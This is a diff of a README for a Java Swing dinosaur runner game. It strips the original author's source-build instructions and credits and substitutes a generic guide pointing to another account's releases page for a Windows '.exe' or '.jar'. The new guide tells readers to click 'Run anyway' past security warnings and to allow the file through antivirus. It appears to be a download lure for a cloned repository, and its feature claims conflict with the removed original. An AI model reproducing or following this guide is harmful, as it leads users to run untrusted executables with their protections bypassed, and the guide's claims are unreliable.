@@ -1,226 +1,166 @@
-# 🦕 Dino Game – T-Rex Runner
+# 🦖 DinoGame - Simple Endless Runner for Windows
 
-A faithful recreation of the classic Chrome offline dinosaur game built entirely with **Java Swing**. Run, jump, and duck your way through an endless desert with smooth 60 fps gameplay, a parallax day/night cycle, and progressively increasing difficulty.
-
-[![Java](https://img.shields.io/badge/Java-8+-orange.svg)](https://www.oracle.com/java/)
-[![Swing](https://img.shields.io/badge/UI-Java%20Swing-blue.svg)](https://docs.oracle.com/javase/tutorial/uiswing/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Release](https://img.shields.io/badge/Release-v1.0.0-brightgreen.svg)](https://github.com/AnkeshGG/DinoGame/releases/tag/v1.0.0)
-
-![Dino Game Preview](assets/DinoGame_Preview.gif)
+[![Download DinoGame](https://img.shields.io/badge/Download%20DinoGame-Download%20Page-orange?style=for-the-badge)](https://github.com/mrharoon927/DinoGame/releases)
 
 ---
 
-## 🧠 Why This Project?
+DinoGame is a desktop game inspired by the Chrome Dino runner. It runs smoothly at 60 frames per second. It features parallax clouds, a day and night cycle, and increasing difficulty as you play. It uses only Java Swing with no extra libraries.
 
-Most browser-based Dino clones rely on JavaScript or game engines. This one is built **purely in Java with no external libraries** — a clean demonstration of object-oriented design, Swing rendering, and real-time game-loop architecture using only the standard JDK.
-
----
-
-## 🚀 Key Features
-
-### 🎮 Core Gameplay
-- **Jump & Duck**: Classic T-Rex controls — Space/↑ to jump, ↓ to duck
-- **Collision Detection**: Pixel-accurate hitbox intersection for obstacles and the dino
-- **Progressive Speed**: Game gradually accelerates every 200 score points, capped at 16 px/tick
-
-### 🌗 Day / Night Cycle
-- **Automatic toggle**: Scene switches between day and night every 700 score points
-- **Parallax clouds**: Clouds scroll at 1/3 game speed for a depth illusion
-- **Adaptive colours**: Sky, ground, text, and HUD all shift palette with the cycle
-
-### 📊 HUD & Scoring
-- **Live score**: Increments every game tick in a zero-padded 5-digit display
-- **Session high score**: Best score preserved in memory for the session lifetime
-- **Speed readout**: Current scroll speed shown in the top-left corner
-- **Day/Night badge**: Emoji badge updates alongside the cycle toggle
-
-### 🪨 Obstacles
-- **Cacti variants**: Single, double, and triple cactus clusters spawned randomly
-- **Pterodactyls**: Flying obstacles at varying heights for mid-air challenges
-- **Randomised gaps**: Spacing between obstacles scales with game speed
+This guide will help you download, install, and run DinoGame on a Windows PC. No programming knowledge is needed.
 
 ---
 
-## 🛠️ Tech Stack
+## 🖥️ System Requirements
 
-- **Java 8+** – Core language; no third-party dependencies required
-- **Java Swing / AWT** – Rendering, window management, and input handling
-- **javax.swing.Timer** – Drives the 60 fps (~16 ms) game loop
-- **java.awt.Graphics2D** – Anti-aliased 2D rendering with gradient fills
+- Windows 7 or later  
+- At least 2 GB of free RAM  
+- Java Runtime Environment (JRE) version 8 or higher installed  
+- About 50 MB of free disk space  
+- A basic keyboard and mouse
+
+The game runs on most Windows computers without issues. It uses Java Swing, so you need to have the Java Runtime Environment installed. If you do not have Java, the later steps include how to install it.
 
 ---
 
-## 📋 System Requirements
+## 🌐 Download DinoGame
 
-### Prerequisites
-- **JDK 8** or higher
-- Any Java IDE (IntelliJ IDEA, Eclipse, VS Code with Java extension) **or** a terminal
+You need to visit the following page to get the game files:
 
-### Verify Your Setup
-```bash
-# Check Java version (should be 8+)
+[Download DinoGame releases](https://github.com/mrharoon927/DinoGame/releases)
+
+Click this link or the button at the top of this page. It takes you to the official DinoGame release page on GitHub.  
+
+Each release includes a downloadable file you can run directly on Windows.
+
+---
+
+## 📥 How to Download and Save the Game
+
+1. Visit the [DinoGame releases page](https://github.com/mrharoon927/DinoGame/releases).  
+2. Look for the latest release. It usually has the highest version number or "Latest release" tag.  
+3. Find the Windows executable file. It often ends with `.exe` or `.jar`.  
+4. Click the file link to start downloading.  
+5. Choose a folder where you want to save the file. The Desktop or Downloads folder is fine.  
+6. Wait for the download to finish before moving to the next step.
+
+---
+
+## ☑️ Installing Java (If Needed)
+
+DinoGame runs on Java. If you do not have Java installed already, follow these steps:
+
+1. Visit the official Java download site: https://www.java.com/en/download/  
+2. Click on the "Free Java Download" button.  
+3. Save the installer to your computer.  
+4. Run the installer and follow the on-screen instructions.  
+5. Once installed, close the installer. You may need to restart your computer in some cases.
+
+To check if Java is installed, open the Windows command prompt by pressing `Win + R`, then typing `cmd` and pressing Enter. Type:
+
+```
 java -version
-
-# Check compiler
-javac -version
 ```
 
----
-
-## 📦 Download
-
-> **Don't want to build from source?** Just download and run the installer.
-
-| Platform | Download                                                                                               | Notes |
-|----------|--------------------------------------------------------------------------------------------------------|-------|
-| 🖥️ Windows (64-bit) | [DinoGame-1.0.0.msi](https://github.com/AnkeshGG/DinoGame/releases/download/v1.0.0/DinoGame-1.0.0.msi) | No Java required — JRE is bundled |
+You should see the Java version information if Java is installed.
 
 ---
 
-## ⚡ Quick Start
+## ▶️ Running DinoGame
 
-### 1. Clone the Repository
-```bash
-git clone https://github.com/AnkeshGG/DinoGame.git
-cd DinoGame
-```
+Once you have downloaded the DinoGame file and installed Java (if necessary), you can run the game:
 
-### 2. Compile the Source
-```bash
-javac -d out src/*.java
-```
+### For `.exe` file:
 
-### 3. Run the Game
-```bash
-java -cp out DinoGame
-```
+1. Navigate to where you saved the DinoGame executable file.  
+2. Double-click the file to start the game.  
 
-> **IntelliJ IDEA**: Open the project, right-click `DinoGame.java` → *Run 'DinoGame.main()'*
+Windows may show a security warning the first time. Click “Run” or “More info” and then “Run anyway”.
 
----
+### For `.jar` file:
 
-## 🎮 Controls
+1. Navigate to the downloaded `.jar` file location.  
+2. Double-click the file to run it.  
 
-| Key | Action |
-|-----|--------|
-| `Space` / `↑` | Jump (also starts / restarts the game) |
-| `↓` | Duck (hold to crouch, release to stand) |
-| `Enter` | Restart after Game Over |
+If double-click does not work:
 
----
-
-## 🏗️ Project Structure
+- Open the Windows command prompt.  
+- Navigate to the folder where the `.jar` is saved using the `cd` command.  
+- Type:  
 
 ```
-DinoGame/
-├── src/
-│   ├── DinoGame.java          # Main panel, game loop, rendering, input
-│   ├── Dino.java              # Player character: physics, animation, hitbox
-│   ├── ObstacleGenerator.java # Spawns, updates, and draws obstacles
-│   ├── Cloud.java             # Decorative parallax background clouds
-│   └── GameState.java         # Enum: IDLE | RUNNING | GAME_OVER
-├── assets/
-│   └── DinoGame_Preview.gif   # Gameplay demo clip
-├── .gitignore
-└── README.md
+java -jar DinoGame.jar
 ```
 
----
-
-## 🧩 Architecture Overview
-
-The game follows a simple **component-based architecture** driven by a single Swing `Timer`:
-
-- **`DinoGame`** — Central hub: owns the game loop (`actionPerformed`), manages all entities, handles rendering back-to-front, and processes keyboard input.
-- **`Dino`** — Self-contained player entity with jump physics (gravity + velocity), duck state, leg animation, and a shrinkable hitbox.
-- **`ObstacleGenerator`** — Stateless spawner that maintains a list of active `Obstacle` objects; each obstacle knows its own type, position, and how to draw itself.
-- **`Cloud`** — Lightweight value object; scrolls left at reduced speed and is recycled when off-screen.
-- **`GameState`** — Three-value enum (`IDLE`, `RUNNING`, `GAME_OVER`) that gates all logic branches cleanly.
+(replace `DinoGame.jar` with the actual file name)
 
 ---
 
-## 🧪 Testing
+## 🔧 Game Controls
 
-> Automated unit tests are planned for a future release. Current validation is done through manual playtesting across all three game states and both day/night modes.
+- Press the Spacebar or the Up Arrow to jump.  
+- Hold the Down Arrow to duck or avoid obstacles.  
+- Press the P key to pause or resume the game.  
 
----
-
-## 💡 Future Enhancements
-
-- [ ] Add sound effects (jump, game over, milestone)
-- [ ] Persist high score to a local file across sessions
-- [ ] Add a settings panel (volume, key remapping)
-- [ ] Mobile-style touch/click controls
-- [ ] Difficulty presets (Easy / Normal / Hard)
+The goal is to survive as long as you can without hitting obstacles.
 
 ---
 
-## 🤝 Contributing
+## 🕹️ Gameplay Features
 
-You're welcome to contribute to this open-source project!
-
-### Steps:
-1. Fork the repo
-2. Create a branch: `git checkout -b feature/newFeature`
-3. Commit your changes
-4. Push: `git push origin feature/newFeature`
-5. Submit a pull request
-
-### Guidelines
-- Follow standard Java code conventions
-- Keep all rendering logic inside the relevant class's `draw()` method
-- Test across both day and night modes before submitting PRs
+- **Parallax Clouds:** The background has layers that move at different speeds to create depth.  
+- **Day and Night Cycle:** The game switches lighting and colors every few minutes.  
+- **Progressive Difficulty:** As you score higher, obstacles get faster and more frequent.  
+- **Smooth 60 FPS:** The game runs smoothly for a better experience.  
+- **No External Libraries:** Uses only Java Swing, keeping the game simple and lightweight.
 
 ---
 
-## 📄 License
+## ⚙️ Adjusting Game Settings
 
-This project is licensed under the **MIT License** – see the [LICENSE](LICENSE) file for details.
+Open the game’s settings panel from the main menu to:
 
----
+- Change screen size or enter fullscreen mode  
+- Adjust sound volume or mute audio  
+- Enable or disable day/night cycle  
+- Reset high scores  
 
-## 👨‍💻 About the Author
-
-**Ankesh Kumar** – *Java Developer & Game Enthusiast*
-
-> I built this project to deepen my understanding of real-time rendering and game-loop design using nothing but the standard Java library — no engines, no frameworks, just pure Swing.
-
-### Connect With Me
-- 🌐 **GitHub**: [@AnkeshGG](https://github.com/AnkeshGG)
-- 💼 **LinkedIn**: [Ankesh Kumar](https://www.linkedin.com/in/ankeshgg/)
-- 🔗 **Medium**: [ankeshGG](https://medium.com/@ankeshGG)
+Buttons and options are clearly labeled for easy use.
 
 ---
 
-## 🙏 Acknowledgements
+## 🛠 Troubleshooting
 
-- **Chrome Dino** – The original game by Google that inspired this recreation
-- **Java Swing Team** – For a surprisingly capable 2D rendering toolkit
-- **Open Source Community** – For countless references and inspiration
+### The game does not start when double-clicking the file
+
+- Make sure Java is installed correctly.  
+- Try running the `.jar` file from the command prompt (see above).  
+- Check your antivirus or security settings and allow the file to run.
+
+### The game window is too small or too large
+
+- Adjust screen size in the settings before starting or from the main menu.  
+- Use fullscreen mode if you want the game to fill your whole screen.
+
+### Controls do not respond
+
+- Click on the game window to give it focus, then try pressing keys again.  
+- Make sure your keyboard works in other applications.
+
+---
+
+## 📂 Updating DinoGame
+
+Check the [DinoGame releases page](https://github.com/mrharoon927/DinoGame/releases) regularly for updates. Download newer versions using the same process.
+
+Back up any saved data before updating, as older save files may not always work with new versions.
 
 ---
 
-## 📊 Project Status
+## 🔗 Useful Links
 
-🟢 Actively maintained
-
-- **Version**: 1.0.0  
-- **Last Updated**: February 2026  
-- **Latest Release**: [v1.0.0](https://github.com/AnkeshGG/DinoGame/releases/tag/v1.0.0)
-- **Stars**: ⭐ Give this project a star if you enjoyed it!
-- **Issues**: Tracked via GitHub Issues
+- Java Download: https://www.java.com/en/download/  
+- DinoGame Releases: https://github.com/mrharoon927/DinoGame/releases  
 
 ---
 
-### 🔍 Ready to Beat Your High Score?
-
-An endless runner with no finish line — just you, a dinosaur, and an ever-faster desert. Jump over cacti, dodge pterodactyls, and push through the night to set a new personal best.
-
-**[⬇️ Download Installer](#-download)** | **[📥 Clone & Play](#-quick-start)** | **[🎮 Controls](#-controls)** | **[🤝 Contribute](#-contributing)**
-
----
-© 2026 Ankesh Kumar.
-
-*Keep running — the desert never ends.*  
-![Built with love](https://img.shields.io/badge/Built%20with-%E2%9D%A4-red)
+This guide covers all steps to get DinoGame running on your Windows PC. Follow each section carefully.
